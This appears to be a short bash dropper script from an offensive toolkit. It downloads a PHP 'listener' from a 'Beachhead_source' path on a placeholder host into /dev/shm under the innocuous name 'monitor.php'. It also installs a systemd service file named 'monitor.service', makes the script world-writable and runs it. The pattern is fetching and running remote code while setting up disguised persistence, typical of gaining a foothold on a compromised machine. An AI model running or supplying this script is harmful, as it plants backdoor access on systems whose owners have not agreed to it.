#!/bin/bash

#Download
wget IP/Beachhead_source/phpListener.php -O /dev/shm/monitor.php


#get service and run
wget IP/services/monitor.service -O /etc/systemd/system/monitor.service

chmod 777 /dev/shm/monitor.php

php /dev/shm/monitor.php